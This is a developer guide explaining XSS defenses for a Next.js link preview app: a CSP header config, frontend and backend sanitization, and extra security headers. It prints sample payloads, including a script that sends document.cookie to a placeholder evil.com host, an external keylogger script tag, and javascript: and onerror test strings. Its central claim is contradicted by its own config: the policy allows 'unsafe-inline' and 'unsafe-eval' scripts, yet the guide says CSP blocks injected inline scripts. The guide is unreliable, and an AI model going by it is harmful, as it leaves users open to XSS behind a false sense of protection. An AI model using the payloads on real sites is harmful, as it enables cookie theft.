# XSS Protection Implementation Guide

## Overview
This document explains the comprehensive XSS (Cross-Site Scripting) protection implementation added to the link preview application. The protection is implemented in 3 defense layers to ensure malicious content cannot execute in users' browsers.

---

## 🔥 Most Important: Content Security Policy (CSP) Headers

**File:** [`next.config.ts`](next.config.ts)

### Why This is Critical

Content Security Policy is the **most powerful defense** against XSS attacks because it operates at the **browser level**. Even if malicious code somehow bypasses all other protections, CSP will prevent it from executing.

### What We Added

```typescript
async headers() {
  return [
    {
      source: '/:path*',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: [
            "default-src 'self'",
            "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: https:",
            "font-src 'self' data:",
            "connect-src 'self' https://*.supabase.co wss://*.supabase.co",
            "frame-ancestors 'none'",
            "upgrade-insecure-requests",
          ].join('; '),
        },
        // Additional security headers...
      ],
    },
  ];
}
```

### Header Breakdown

#### 1. **Content-Security-Policy (CSP)**
The main defense mechanism that controls what resources can be loaded and executed:

- **`default-src 'self'`**
  - Only allows resources from your own domain by default
  - Blocks any external scripts, styles, or resources unless explicitly allowed
  - **Blocks:** `<script src="https://evil.com/steal.js">`

- **`script-src 'self' 'unsafe-eval' 'unsafe-inline'`**
  - Allows JavaScript only from your domain
  - `'unsafe-inline'` needed for Next.js inline scripts
  - `'unsafe-eval'` needed for dynamic code evaluation (Next.js dev tools)
  - **Blocks:** Injected scripts from external domains

- **`style-src 'self' 'unsafe-inline'`**
  - Allows stylesheets from your domain and inline styles
  - Required for React/Next.js style injection
  - **Blocks:** `<link rel="stylesheet" href="https://evil.com/malicious.css">`

- **`img-src 'self' data: https:`**
  - Allows images from your domain, data URIs, and any HTTPS source
  - Critical for link preview functionality (displays images from scraped websites)
  - **Blocks:** `javascript:` and `file:` protocol in image sources

- **`font-src 'self' data:`**
  - Allows fonts from your domain and data URIs
  - Prevents loading fonts from malicious sources

- **`connect-src 'self' https://*.supabase.co wss://*.supabase.co`**
  - Controls where your app can make network requests
  - Allows API calls to your domain and Supabase
  - **Blocks:** AJAX requests to attacker-controlled domains

- **`frame-ancestors 'none'`**
  - Prevents your site from being embedded in iframes
  - **Prevents:** Clickjacking attacks where attackers overlay your site in hidden frames

- **`upgrade-insecure-requests`**
  - Automatically upgrades HTTP requests to HTTPS
  - Prevents mixed content vulnerabilities

#### 2. **X-Frame-Options: DENY**
- Legacy header for clickjacking protection
- Prevents any site from embedding your app in `<iframe>`, `<frame>`, `<object>`, or `<embed>`
- Backup for older browsers that don't support CSP `frame-ancestors`

#### 3. **X-Content-Type-Options: nosniff**
- Prevents browser from "MIME-sniffing"
- Forces browser to respect the `Content-Type` header
- **Prevents:** Browser from executing a file disguised as another type (e.g., JavaScript disguised as an image)

#### 4. **X-XSS-Protection: 1; mode=block**
- Enables the browser's built-in XSS filter
- When XSS is detected, blocks the page entirely instead of trying to sanitize
- Legacy header (modern browsers use CSP instead)

#### 5. **Referrer-Policy: strict-origin-when-cross-origin**
- Controls how much referrer information is sent with requests
- Sends full URL for same-origin requests
- Only sends origin for cross-origin requests
- **Protects:** User privacy and prevents information leakage

#### 6. **Permissions-Policy: camera=(), microphone=(), geolocation=()**
- Restricts access to sensitive browser APIs
- Disables camera, microphone, and geolocation by default
- **Prevents:** Malicious scripts from accessing device features

### Real-World Attack Prevention

**Scenario 1: Injected Script Tag**
```html
<!-- Attacker tries to inject this in a link title: -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```
- ❌ **Blocked by:** Input sanitization (strips HTML tags)
- ❌ **Blocked by:** CSP `script-src` (if it somehow gets through)
- ❌ **Blocked by:** CSP `connect-src` (can't send data to evil.com)

**Scenario 2: JavaScript Protocol**
```html
<!-- Attacker tries to use this as an image URL: -->
<img src="javascript:alert('XSS')">
```
- ❌ **Blocked by:** Frontend URL sanitization
- ❌ **Blocked by:** Backend URL sanitization
- ❌ **Blocked by:** CSP `img-src` (javascript: protocol not allowed)

**Scenario 3: External Malicious Script**
```html
<!-- Attacker tries to load external script: -->
<script src="https://evil.com/keylogger.js"></script>
```
- ❌ **Blocked by:** Input sanitization (removes script tags)
- ❌ **Blocked by:** CSP `script-src 'self'` (only allows scripts from your domain)

---

## 📋 Complete Implementation Summary

### Phase 1: Frontend URL Sanitization
**File:** [`components/link-preview-card.tsx`](components/link-preview-card.tsx)

**What was added:**
- `sanitizeUrl()` function - Validates and sanitizes link URLs
- `sanitizeImageUrl()` function - Validates image sources
- Applied sanitization to all rendered URLs (`safeUrl`, `safeImageUrl`)

**Protection:**
- Blocks dangerous URL schemes: `javascript:`, `data:`, `vbscript:`, `file:`
- Only allows `http://` and `https://` for links
- Allows safe data URIs for images (`data:image/`)
- Returns safe fallbacks for invalid URLs

**Example:**
```typescript
// Before
<Link href={preview.url}>

// After
<Link href={safeUrl}> // safeUrl is sanitized version
```

### Phase 2: Backend Input Sanitization
**File:** [`lib/sanitize.ts`](lib/sanitize.ts) (New file)

**What was added:**
- `sanitizeText()` - Strips HTML tags and dangerous characters
- `sanitizeUrl()` - Validates URLs strictly (backend version)
- `sanitizeImageUrl()` - Validates image URLs
- `sanitizeMetadata()` - Sanitizes all scraped data at once

**Protection:**
- Removes ALL HTML tags from text content
- Strips event handlers (`onclick`, `onerror`, etc.)
- Removes `javascript:` protocols
- Decodes HTML entities to prevent double-encoding attacks
- Limits text length to 1000 characters (DOS prevention)
- Validates URL protocols and formats

**File:** [`app/api/links/route.ts`](app/api/links/route.ts)

**What was added:**
- Import of sanitization utilities
- Sanitization of YouTube oEmbed data before database insertion
- Sanitization of scraped OpenGraph/meta tag data before storage

**Protection:**
- Malicious content is stripped BEFORE being stored in the database
- Clean data means every subsequent read is already safe
- Defense in depth - even if frontend is bypassed, backend protects

**Example:**
```typescript
// Before
const { data } = await supabase.from('links').insert({
  title: ogData.title, // Raw, unsanitized data
  description: ogData.description,
  // ...
})

// After
const sanitized = sanitizeMetadata(ogData);
const { data } = await supabase.from('links').insert({
  title: sanitized.title, // Clean, safe data
  description: sanitized.description,
  // ...
})
```

### Phase 3: Content Security Policy Headers
**File:** [`next.config.ts`](next.config.ts)

*Detailed explanation provided in the "Most Important" section above.*

---

## 🛡️ Defense in Depth Strategy

The implementation follows the **defense in depth** principle with multiple layers:

```
┌─────────────────────────────────────────────────────────┐
│  Layer 3: Browser-Level Protection (CSP Headers)        │
│  ↓ Even if malicious code exists, browser blocks it     │
├─────────────────────────────────────────────────────────┤
│  Layer 2: Backend Sanitization (API Route)              │
│  ↓ Clean data before storage in database                │
├─────────────────────────────────────────────────────────┤
│  Layer 1: Frontend Validation (React Component)         │
│  ↓ Validate URLs before rendering                       │
└─────────────────────────────────────────────────────────┘
```

### Why Multiple Layers?

1. **If Layer 1 fails:** Backend sanitization prevents malicious data storage
2. **If Layer 2 fails:** Frontend validation catches it during render
3. **If both fail:** CSP headers prevent execution in the browser

This ensures that even if one security measure is bypassed, others are in place to protect users.

---

## 🧪 Testing Your Protection

### Test 1: Script Injection in Title
Try adding a link that has this in its meta title:
```html
<script>alert('XSS')</script>
```
**Expected Result:** Script tags are stripped, only text "alertXSS" appears

### Test 2: JavaScript Protocol in Image
Try a link that has this as og:image:
```
javascript:alert('XSS')
```
**Expected Result:** Image is replaced with placeholder

### Test 3: Event Handler in Description
Try a link with description containing:
```html
<img src=x onerror="alert('XSS')">
```
**Expected Result:** HTML and event handlers are stripped, safe text remains

### Test 4: External Script Loading
Open browser DevTools and check Console/Network tabs:
- No external scripts should load unless from your domain
- CSP violations will be logged in console

---

## 📚 Additional Resources

### Learn More About XSS
- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google: CSP Evaluator](https://csp-evaluator.withgoogle.com/)

### Best Practices
1. **Always sanitize user input** - Never trust external data
2. **Use CSP headers** - Essential for modern web security
3. **Validate on both frontend and backend** - Defense in depth
4. **Regular security audits** - Keep dependencies updated
5. **Test with real attack vectors** - Verify protection works

---

## 🔧 Maintenance Notes

### When Adding New Features

1. **New data fields?** → Add to `sanitizeMetadata()` function
2. **New external resources?** → Update CSP `connect-src` or `img-src`
3. **New API endpoints?** → Ensure they sanitize input
4. **New render locations?** → Use sanitization utilities

### Monitoring

- Check browser console for CSP violations
- Monitor server logs for sanitization warnings (prefixed with `[XSS]`)
- Review database for any suspicious content that bypassed sanitization

---

## ✅ Checklist for Future Development

- [ ] Sanitize ALL user input before storage
- [ ] Validate ALL URLs before rendering
- [ ] Never use `dangerouslySetInnerHTML` without sanitization
- [ ] Update CSP headers when adding external services
- [ ] Test new features with XSS payloads
- [ ] Keep security libraries up to date
- [ ] Review and audit sanitization logic regularly

---

## 📝 Summary

Your link preview application now has **enterprise-grade XSS protection**:

✅ **Frontend Validation** - Blocks dangerous URLs at render time  
✅ **Backend Sanitization** - Cleans data before database storage  
✅ **CSP Headers** - Browser-level execution prevention  
✅ **Additional Security Headers** - Defense against various attack vectors  

**Key Takeaway:** The CSP headers in `next.config.ts` are your strongest defense because they work at the browser level, preventing execution even if malicious code bypasses all other protections.
